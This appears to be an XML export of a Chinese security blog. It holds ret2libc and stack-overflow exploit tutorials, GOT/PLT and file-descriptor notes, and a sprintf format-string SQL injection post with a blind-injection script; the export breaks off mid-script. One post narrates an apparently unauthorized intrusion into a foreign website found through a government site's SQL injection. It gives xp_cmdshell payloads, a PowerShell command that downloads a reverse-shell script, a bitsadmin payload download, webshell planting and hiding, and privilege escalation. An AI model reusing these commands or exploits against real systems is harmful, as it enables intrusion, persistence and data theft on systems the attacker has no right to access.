一目了然后，构造poc即可。先来梳理一下我们需要知道什么条件：一、puts函数的地址和真实地址二、main函数的真实地址三、system函数的真实地址四、’/bin/sh’字符串的位置条件一我们已经具备了，那么怎么搞定剩下的条件，以及堆栈位置。怎么获取main、system和’/bin/sh’的真实地址呢？当然与获取put的真实地址一样 1234567main_addr = elf.symbols[&apos;main&apos;]程序运行起来后main_addr就是真实地址了之后相减获取基址libc.address = puts_addr - libc.symbols[&apos;puts&apos;]然后获取system和&apos;/bin/sh&apos;的地址system_addr = libc.symbols[&apos;system&apos;]binsh_addr = next(libc.search(&apos;/bin/sh&apos;)) 那么直接构造exp 12345678910111213141516171819from pwn import *sh = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)libc = elf.libcputs_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]main_addr = elf.symbols[&apos;main&apos;]payload = flat([&quot;A&quot; * 112, puts_plt, main_addr, puts_got])sh.sendlineafter(&quot;Can you find it !?&quot;, payload)puts_addr = u32(sh.recv(4))libc.address = puts_addr - libc.symbols[&apos;puts&apos;]system_addr = libc.symbols[&apos;system&apos;]binsh_addr = next(libc.search(&apos;/bin/sh&apos;))payload2 = flat([&quot;B&quot; * 104, system_addr, &quot;B&quot; * 4, binsh_addr])sh.sendline(payload2)sh.interactive() 泄露__libc_start_main地址，使用_start也是一样的，懂得原理稍微改一下就可以，在ctfwiki 中引用了LibcSearcher 1libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr) 另外也可以根据第二种情况的思路，引入gets和buf来获取字符串’/bin/sh’，如下图所示 exp如下 12345678910111213141516171819202122from pwn import *sh = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)libc = elf.libcputs_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]main_addr = elf.symbols[&apos;main&apos;]payload = flat([&quot;A&quot; * 112, puts_plt, main_addr, puts_got])sh.sendlineafter(&quot;Can you find it !?&quot;, payload)puts_addr = u32(sh.recv(4))gets_plt = 0x08048440buf2 = 0x804a080libc.address = puts_addr - libc.symbols[&apos;puts&apos;]system_addr = libc.symbols[&apos;system&apos;]payload2 = flat([&apos;a&apos; * 104, gets_plt, system_addr, buf2, buf2])sh.sendline(payload2)sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 0x05 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。参考：http://drops.xmd5.com/static/drops/tips-6597.html (蒸米大佬的文章，极力推荐)https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zhhttp://www.cnblogs.com/elvirangel/p/7484772.html]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[走进栈溢出]]></title>
    <url>%2F2020%2F03%2F04%2F1%2F</url>
    <content type="text"><![CDATA[最近事情较多，又是停了好久才更，无奈，我渴望知识的心灵遭受到了创伤 0x01 前言 和我一样，有一些计算机专业的同学可能一直都在不停地码代码，却很少关注程序是怎么执行的，也不会考虑到自己写的代码是否会存在栈溢出漏洞，借此机会我们一起走进栈溢出。 0x02 程序是怎么运行的 在了解栈溢出之前我们先了解一下程序执行过程程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到call指令的下一条指令继续执行，函数调用过程通常使用堆栈实现。123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; test1(1); test2(2); test3(3); return 0;&#125;int test1(int test1)&#123;int a = 6; printf(&quot;1&quot;); return 1;&#125;int test2(int test2)&#123; printf(&quot;2&quot;); return 2;&#125;int test3(int test3)&#123; printf(&quot;3&quot;); return 3;&#125; 将以上代码编译成32位可执行文件，放在ollydbg中就行调试，来详细看一下执行过程因为程序的执行可以看做一个一个函数的执行(main函数也一样)，因此我们挑选其中一个即可，在test1()函数设置断点F7单步调试第一步mov dword ptr ss:[esp],0x1，进行传参，简洁明了。第二步call mian.00401559，进入test()，这里我们关注一下esp和栈顶值，将该指令的下一条指令的地址进行压栈，既然有压栈那么就会有出栈，这就与函数中的retn指令形成呼应。第三步push ebp，就是把ebp的值进行压栈，那么这个ebp是什么呢？有什么用呢？EBP叫做扩展基址指针寄存器(extended base pointer) ，里面放一个指针，该指针指向系统栈最上面一个栈帧的底部，用于C运行库访问栈中的局部变量和参数。那么这一步的意义就是：保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧第四步，mov ebp，esp，将esp的值放在ebp中，我们再来了解一下什么是esp？ESP（Extended Stack Pointer）为扩展栈指针寄存器，是指针寄存器的一种，用于存放函数栈顶指针，指向栈的栈顶（下一个压入栈的活动记录的顶部），也就是它不停在变，刚才提到的ebp指向栈底，在函数内部执行过程中是不变。那么我们再看一下这一步的作用：从第三步可以知道esp存储的值是旧栈帧中的帧基指针，而esp值栈顶指针，随时都在变，因此为了函数结束后能恢复，把esp值（外层函数栈底地址）保存在本函数栈底ebp中。简而言之，将内部函数ebp的值作为地址，它存放外函数的ebp的值。这一步在末尾也存在逆向指令leave。第五步是sub esp,0x28，开辟该函数的局部变量空间紧接着第六步mov dword ptr ss:[ebp-0xC],0x6，给变量a一个大小是0xC的空间，并且赋值。然后就是传参字符1的ascii码，调用printf函数，把返回值放到eax。我们重点来看leave指令，可以发现ebp的值恢复了，esp的值也变了，相当于mov esp,ebp;pop ebp最后执行retn指令，至此一个函数执行完毕，esp和eip的值都被改变，相当于pop eip，然后程序继续执行。EIP是指令寄存器，存放当前指令的下一条指令的地址。CPU该执行哪条指令就是通过EIP来指示的 0x03 栈溢出 分析完这一过程，相信大家对函数是怎么执行的应该明朗了，那么我们言归正传，继续聊一下栈溢出。首先我们先看一下什么是栈？栈可以看作是一个漏斗，栈底地址大，栈顶地址小，然后在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。栈溢出属于缓冲区溢出，指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。另外，我们也不难发现，发生栈溢出的基本前提是：程序必须向栈上写入数据、写入的数据大小没有被良好地控制。引用一个例子来了解一下栈溢出12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; 很显然符合以上两个条件，gets()成为突破口我们在主函数处下断点，运行和调试lea eax，dword ptr ss:[ebp-0x14] 这时开辟一个空间给变量，也即是s，如图所示我们想执行sucess()函数，要怎么办呢？执行完vulnerable()函数后，会还原ebp，改变esp的值(leave)，然后retn，也就是pop eip，然后CPU根据eip指针指向的指令继续运行。我们能抓到的点就是控制eip，怎么控制？通过控制栈顶的值，那么栈顶的值是什么？栈顶的值是进入该函数时储存的下一条指令的地址。这里提一点，进入函数，要保存两个值：下一条命令的地址、EBP旧栈帧的帧基指针，只有这样才能完全恢复。此时我们可以构造payload，来控制我们要控制的地方，栈中存储EBP值的存储单元的上一个存储单元，也就是图中的存储address的存储单元我们先试验一下输入0x14 *‘A’+BBBB+0000，发生的变化很好，按照我们的预想进行(python -c ‘print “A”* 0x18+p32(0x00401520)’) 就可以达到栈溢出的效果 0x04 尾记 还没有入门，只是个人的见解，如有错误，希望各位大佬指出。参考：https://en.wikipedia.org/wiki/Stack_buffer_overflowhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解GOT表和PLT表]]></title>
    <url>%2F2020%2F02%2F08%2F1%2F</url>
    <content type="text"><![CDATA[一起感受二进制魅力所在 0x01 前言 操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，那么GOT表与PLT表就应运而生。 0x02 初探GOT表和PLT表 我们先简单看一个例子我们跟进一下scanf@plt会发现，有三行代码123jmp 一个地址push 一个值到栈里面jmp 一个地址 看函数的名字就可以知道这是scanf函数的plt表，先不着急去了解plt是做什么用的，我们继续往下看我们先看一下第一个jmp是什么跳到哪里其实这是plt表对应函数的got表，而且我们会发现0x201020的值是压栈命令的地址，其他地方为0，此时就想问：一、got表与plt表有什么意义，为什么要跳来跳去？二、got表与plt表有什么联系，有木有什么对应关系？那么带着疑问先看答案，再去印证我们要明白操作系统通常使用动态链接的方法来提高程序运行的效率，而且不能回写到代码段上。在上面例子中我们可以看到，call scanf —&gt; scanf的plt表 —&gt;scanf的got表，至于got表的值暂时先不管，我们此刻可以形成这样一个思维，它能从got表中找到真实的scanf函数供程序加载运行。我们这么认为后，那么这就变成了一个间接寻址的过程我们就把获取数据段存放函数地址的那一小段代码称为PLT（Procedure Linkage Table）过程链接表存放函数地址的数据段称为GOT（Global Offset Table）全局偏移表。我们形成这么一个思维后，再去仔细理解里面的细节 0x03 再探GOT表和PLT表 已经明白了这么一个大致过程后，我们来看一下这其中是怎么一步一步调用的上面有几个疑点需要去解决：一、got表怎么知道scanf函数的真实地址？二、got表与plt表的结构是什么？我们先来看plt表刚才发现scanf@plt表低三行代码是 jmp 一个地址 ，跟进看一下是什么其实这是一个程序PLT表的开始（plt[0]），它做的事情是：12push got[1]jmp **got[2] 后面是每个函数的plt表。此时我们再看一下这个神秘的GOT表除了这两个（printf和scanf函数的push 0xn的地址，也就是对应的plt表的第二条代码的地址），其它的got[1]， got[2] 为0，那么plt表指向为0的got表干什么呢？因为我们落下了一个条件，现代操作系统不允许修改代码段，只能修改数据段，也就是回写，更专业的称谓应该是运行时重定位。我们把程序运行起来，我们之前的地址和保存的内容就变了在这之前，我们先把链接时的内容保存一下，做一个对比12345② 寻找printf的plt表③ jmp到plt[0]④ jmp got[2] -&gt; 0x00000⑤⑥ printf和scanf的got[3] got[4] -&gt; plt[1] plt[2]的第二条代码的地址⑦⑧ 证实上面一点 运行程序，在scanf处下断点可以发现，此时scanf@plt表变了，查看got[4]里内容依然是push 0x1所在地址继续调试，直到这里，got[4]地址被修改此时想问了，这是哪里？然后就是got[2]中call&lt;_dl_fixup&gt;从而修改got[3]中的地址那么问题就来了，刚才got[2]处不是0吗，怎么现在又是这个(_dl_runtime_resolve)？这就是运行时重定位。其实got表的前三项是：123got[0]：address of .dynamic section 也就是本ELF动态段(.dynamic段）的装载地址got[1]：address of link_map object( 编译时填充0）也就是本ELF的link_map数据结构描述符地址，作用：link_map结构，结合.rel.plt段的偏移量，才能真正找到该elf的.rel.plt表项。got[2]：address of _dl_runtime_resolve function (编译时填充为0) 也就是_dl_runtime_resolve函数的地址，来得到真正的函数地址，回写到对应的got表位置中。 那么此刻，got表怎么知道scanf函数的真实地址？这个问题已经解决了。我们可以看一下其中的装载过程：说到这个，可以看到在_dl_runtimw_resolve之前和之后，会将真正的函数地址，也就是glibc运行库中的函数的地址，回写到代码段，就是got[n]（n&gt;=3）中。也就是说在函数第一次调用的时，才通过连接器动态解析并加载到.got.plt中，而这个过程称之为延时加载或者惰性加载。到这里，也要接近尾声了，当第二次调用同一个函数的时候，就不会与第一次一样那么麻烦了，因为got[n]中已经有了真实地址，直接jmp该地址即可。 0x04 尾记 当时学习时看到大佬精心制作的一张动图，在此借用一下，特别感谢。 想学习二进制的pwn弟弟还需要努力，希望我的小白学习经验记录下来可以帮助更多和我一样的小白。]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解File descriptor]]></title>
    <url>%2F2020%2F02%2F07%2F1%2F</url>
    <content type="text"><![CDATA[想学二进制的pwn弟弟正在艰难的起步 0x01 前言 首先我们先普及一下什么是File descriptor？维基百科中说：is an abstract indicator (handle) used to access a file or other input/output resource一个文件或其他输入/输出资源的抽象指示符在操作系统中可以这样去理解：进程(数值+指针)-&gt;系统(文件表中一系列操作)-&gt;引节点表(描述文件系统对象)那么进程中的file descriptor的这个数值其实就是 is an abstract indicator (handle) used to access a file or other input/output resource 然后他是指向相应的file table 0x02 走进File descriptor 我们来看四个file descriptor的值会以此增加，他们只想不同的操作那么为什么从3开始？是不是巧合？012去哪呢？在证明0、1、2的去向之前，我们先看一下file descriptor值的分配规则：fd0与fd1从3开始依次递增，我们刚才的第二个问题就不是巧合，然后我们把fd0的句柄close掉，也就说刚才的3关闭了，重新开始一个fd2，发现fd2的值为3，而不是5，也就是占用了刚才关闭的fd0的值我们就不妨这么猜测，如下图假如继续fd3=open，那么fd3值为5，也就是在红色区域那么我们可以初步得出一个结论，分配原则：寻找没有被占用的最低的值，然后去占用那么我们证实我们的结论和探寻0、1、2在哪？其实那么，我们关闭stdin标准输入来看下会发生什么？运行fd后直接输入数值，两次不一样，也就是标准输入被关闭，in自动填充一个随机值继续关闭stdout输入hello后，没有执行printf输出函数，然后我们将stdout关闭调，新开一个fd，按照我们之前的推断那么fd值应该为1 0x03 pwnable-fd 把结论进行验证，使得对file descriptor更深刻了，我们来做一下pwnable的fd题目巩固一下：ssh连上后，cat fd.c只需要让buf的值为 LETMEWIN 即可cat flag，buf的是read()函数从fd中获取的，fd又是atoi(argv[1]) - 0x1234得来的，可以控制。那么根据我们刚才学习的file descriptor的知识，只需要让fd为0，那么buf的值就是可以通过输入控制的，计算可以知道argv[1]的值4660虽然flag得到了，为了学习pwn，练习写一下exp 0x04 尾记 想学习二进制的pwn弟弟还需要努力，希望我的小白学习经验记录下来可以帮助更多和我一样的小白。]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透随笔-记一次境外网站渗透]]></title>
    <url>%2F2019%2F11%2F17%2F1%2F</url>
    <content type="text"><![CDATA[写下发生的故事，细品人生的乐趣 0x1 Forward 前段时间，某位师傅找到国外政府网站的sql注入 拿到站点简单测试了下发现123数据库：mssql系统版本：windows服务器可以使用xp_cmdshell 执行1payload: aspx?AticalID=&apos;;use master;exec dbo.xp_cmdshell &apos;ping [服务器]&apos;;--+ 可以发现xp_cmdshell可使用，下一步就是找一下绝对路径，写shell直接拿下，在寻找绝对路径的时候，把url后面一部分上去后，会成功跳转到另一个网站 此时正式开始了 0x2 曲折的getshell获取绝对路径 很显然存在注入，但是不存在万能密码，可惜了，不过却可以从报错信息中发现绝对路径 此时把xp_cmdshell激活，然后把扩展库也激活1payload : admin&apos; exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure;--+ 页面返回正常，应该是语句执行成功，于是ping一下服务器看一下时候可以使用，在这个时候有一个不错的收获，还想来源ip与之前那个政府站的ip是一样，猜测iis绑定了多个域名。 尝试写shell 此时先写一个txt文件试探一下是否可行 虽然返回正常，但是无法访问 http://xxx.xxx.xxx/a.txt ,找不到资源，当时在想是不不能写，很无奈，就去尝试可不可以直接反弹shell, 1C:\Users\&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress xxx.xxx.xxx.xxx -p 8080 但是360直接报毒，猜想这个办法行不通，试了一下果然不行，然后尝试远程下载我的服务器上的免杀msf，然后执行 1bitsadmin /transfer mydownloadjob /download /priority normal http://xxx.xxx.xxx.xxx/msf.exe %temp%/msf.exe 尝试去访问，网页404，查看apache日志，果然没有该ip的访问记录，这个办法pass，是不是杀软太强，或者权限太低，无法执行下载命令。然而就在走投无路的时候，事情出现了转机，在回过头来自习琢磨payload的时候，发现1c:\EMTTS Data\ 这个地方不对，本地尝试果真dos下路径有空格会报错，百度一波解决方法https://www.cnblogs.com/hoojjack/p/7010814.html 加上双引号后，重新构造payload，访问a.txt，有了收获 嘻嘻嘻，欢欢喜喜写shell 12这里普及一个小知识：&apos;&lt;&gt;&apos;在dos命令中需要转义 访问a.aspx发现404，只能说需要上免杀，不过之前应该好奇看看是什么杀软（国外不会也用360吧23333） 12payload:tasklist &gt; &quot;c:\EMTTS Data\xxxx\xxx\b.txt&quot; 百度一下123ESET这一名称最早来源于埃及神话中的女神Isis。Isis又称作Aset或Eset，是地神Geb和天神Nut的女儿，是主管爱情和富庶的女神，也是负责治疗和魔力的女神。ESET在英文中可以理解为Essential Solution Against Evolving Threats 之后尝试写冰蝎马，虽然写进去了，访问时出错 冰蝎连接也不行，仔细检查语句，始终连接不上又是一个峰回路转，不断尝试新的payload，不同的姿势，终于使用 &gt;&gt; 追加符号写文件，居然可以成功getshell，详细操作不多说，很简单的操作 至此成功getshell 提权 查看下系统信息，端口服务信息，路由信息 把补丁放在对比工具中 神器网站：https://bugs.hacking8.com/tiquan/另附几个：https://github.com/SecWiki/windows-kernel-exploits （补丁）、 https://www.uedbox.com/post/8744/ （本地提权工具） 现在先把shell文件加一个隐藏权限1234attrib +s +h a.aspxattrib命令 用于修改文件属性+s 设置系统文件属性+h 设置隐藏属性 但是发现权限不够，还是要提权，试过上传免杀msfpayload，但是通信时被杀，此方法pass，于是根据检查出来的漏洞进行提权（该方法后续尝试），因为是iis，直接祭出iis通杀0day 当然其他的方法也是可以的，后来用ms16-032也可以提权成功附网址:https://github.com/1234xxh/windows-kernel-exploits/tree/master/MS16-032 (fork来的) 发现3389设计开着的，直接远程连接 进去后找到这搞鬼的的东西 开始艰难的内网渗透（持续更新…）]]></content>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入解析sprintf格式化字符串漏洞]]></title>
    <url>%2F2018%2F11%2F05%2F1%2F</url>
    <content type="text"><![CDATA[只有不断地探索新的知识，才能感受到无穷的乐趣 0x01 sprintf()讲解首先我们先了解sprintf()函数 sprintf() 函数把格式化的字符串写入变量中。123sprintf(format,arg1,arg2,arg++)arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &quot;\$&quot; 组成。 通过几个例子回顾一下sprintf 例子1：12345678&lt;?php$number = 123;$txt = sprintf(&quot;带有两位小数：%1\$.2f&lt;br&gt;不带小数：%1\$u&quot;,$number);echo $txt;?&gt;输出结果:带有两位小数：123.00 不带小数：123 例子2：12345678910111213141516171819&lt;?php$num1 = 123456789;$num2 = -123456789;$char = 50;// ASCII 字符 50 是 2//注释：格式值 &quot;%%&quot; 返回百分号echo sprintf(&quot;%%b = %b&quot;,$num1).&quot;&lt;br&gt;&quot;; // 二进制数echo sprintf(&quot;%%c = %c&quot;,$char).&quot;&lt;br&gt;&quot;; // ASCII 字符echo sprintf(&quot;%%s = %s&quot;,$num1).&quot;&lt;br&gt;&quot;; // 字符串echo sprintf(&quot;%%x = %x&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（小写）echo sprintf(&quot;%%X = %X&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（大写）?&gt;输出结果:%b = 111010110111100110100010101%c = 2 //注意var_dump(&apos;2&apos;)为string%s = 123456789%x = 75bcd15%X = 75BCD15 0x02 sprintf注入原理底层代码实现 我们来看一下sprintf()的底层实现方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475switch (format[inpos]) &#123;case &apos;s&apos;: &#123;zend_string *t;zend_string *str = zval_get_tmp_string(tmp, &amp;t);php_sprintf_appendstring(&amp;result, &amp;outpos,ZSTR_VAL(str),width, precision, padding,alignment,ZSTR_LEN(str),0, expprec, 0);zend_tmp_string_release(t);break; &#125; case &apos;d&apos;: php_sprintf_appendint(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign); break; case &apos;u&apos;: php_sprintf_appenduint(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment); break; case &apos;g&apos;: case &apos;G&apos;: case &apos;e&apos;: case &apos;E&apos;: case &apos;f&apos;: case &apos;F&apos;: php_sprintf_appenddouble(&amp;result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign ); break; case &apos;c&apos;: php_sprintf_appendchar(&amp;result, &amp;outpos, (char) zval_get_long(tmp)); break; case &apos;o&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec); break; case &apos;x&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec); break; case &apos;X&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec); break; case &apos;b&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec); break; case &apos;%&apos;: php_sprintf_appendchar(&amp;result, &amp;outpos, &apos;%&apos;); break; default: break;&#125; 可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%1$\）被替换为空 因此sprintf注入，或者说php格式化字符串注入的原理为：要明白%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用。 这里我们举两个例子NO.1 不使用占位符号12345678&lt;?php$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot; ;$args = &quot;admin&quot; ;echo sprintf ( $sql , $args ) ;//=&gt; echo sprintf(&quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;, &quot;admin&quot;);//此时%\回去匹配admin字符串，但是%\只会匹配空运行后的结果select * from user where username = &apos;&apos; and 1=1#&apos; NO.2 使用占位符号12345678910&lt;?php$input = addslashes (&quot;%1$&apos; and 1=1#&quot; );$b = sprintf (&quot;AND b=&apos;%s&apos;&quot;, $input );$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; $b &quot;, &apos;admin&apos; );//对$input与$b进行了拼接//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; AND b=&apos;%1$\&apos; and 1=1#&apos; &quot;, &apos;admin&apos; );//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空echo $sql ;运行后的结果SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 对于这个问题，我们还可以这样写12$sql = sprintf (&quot;SELECT * FROM table WHERE a=&apos;%1$\&apos; AND b=&apos;%d&apos; and 1=1#&apos; &quot;,&apos;admin&apos;);//result: SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 第一个格式化处匹配时为空，会让给后面的格式化匹配 以上两个例子是吃掉’\’来使得单引号逃逸出来下面这个例子我们构造单引号 NO.3 对%c进行利用123456&lt;? php$input1 = &apos;%1$c) OR 1 = 1 /*&apos; ;$input2 = 39 ;$sql = &quot;SELECT * FROM foo WHERE bar IN (&apos; $input1 &apos;) AND baz = %s&quot; ;$sql = sprintf ( $sql , $input2 );echo $sql ; %c起到了类似chr()的效果，将数字39转化为‘，从而导致了sql注入。所以结果为：1SELECT * FROM foo WHERE bar IN (&apos;&apos;) OR 1 = 1 /*) AND baz = 39 小结 漏洞利用条件 sql语句进行了字符拼接 拼接语句和原sql语句都用了vsprintf/sprintf 函数来格式化字符串1234567ps:mysql&gt; SELECT ascii(&apos;\&apos;&apos;);+-------------+| ascii(&apos;\&apos;&apos;) |+-------------+| 39 |+-------------+ 0x03 题目训练一道注入题目 形式很像SQL注入，而且题目中提示为SQLI先试了一下弱口令，确定username为admin那么就对username与password进行注入，开始普通注入，二次解码，宽字节，过滤空格，过滤关键字等姿势进行构造注入语句都无果，而且还耗费大量的时间，不过后来get到一种姿势，使用burpsuit的intruder跑一下，来查看那些字母或者字符没有被过滤掉（waf字典）后来发现%可疑，于是拿出来repeater一下sprintf函数出错，那么sprintf是什么，格式化字符串，于是乎就懂得其中的原理了，是其单引号逃逸构造username=admin%1$\’ and 1=2# 与 username=admin%1$\’ and 1=1#发现如下的结果可以发现’后面的语句带入执行了，这就是注入点，使用sqlmap跑一下事先抓取post包1python sqlmap.py -r 3.txt -p username --level 3 --dbs --thread 10 于是对ctf进行跑tables得到对flag跑columns得到对每个列进行dump但是dump下来不对，找了一波原因没有找到，开始用脚本跑跑完后才发现sqlmap跑出来的列不对，应该是flag，于是1python sqlmap.py -r 3.txt -p username --level 3 -D ctf -T flag -C flag --dump --thread 10 才得到正确结果 ：）下面是脚本跑的 中心思想 先判断length然后使用ascii判断字母ascii(substr(database(),” + str(i) +”,1))=” + str(ord(c)) + “#”使用这个语句进行判断 涉及到的一些知识点： 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#coding:utf-8import requestsimport stringdef boom(): url = r&apos;http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/&apos; s = requests.session() //会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。 dic = string.digits + string.letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-=&quot; right = &apos;password error!&apos; error = &apos;username error!&apos; lens = 0 i = 0 //确定当前数据库的长度 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;length(database())&gt;&quot; + str(i) + &quot;#&quot; data=&#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens=i break i+=1 pass print(&quot;[+]length(database()): %d&quot; %(lens)) //确定当前数据库的名字 strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr(database(),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]database():%s&quot; %(strs)) lens=0 i = 1 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; //对当前的数据库，查询第一个表的长度 data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(table): %d&quot; %(lens)) strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; // 数字一定要str才可以传入 data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]table_name:%s&quot; %(strs)) tablename = &apos;0x&apos; + strs.encode(&apos;hex&apos;) //编码为16进制 table_name = strs lens=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(column_name) from information_schema.columns where table_name = &quot; + str(tablename) + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(column): %d&quot; %(lens)) strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select column_name from information_schema.columns where table_name = &quot; + str(tablename) +&quot; limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]column_name:%s&quot; %(strs)) column_name = strs num=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select count(*) from &quot; + table_name + &quot;)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: num = i break i+=1 pass print(&quot;[+]number(column): %d&quot; %(num)) lens=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(&quot; + column_name + &quot;) from &quot; + table_name + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = 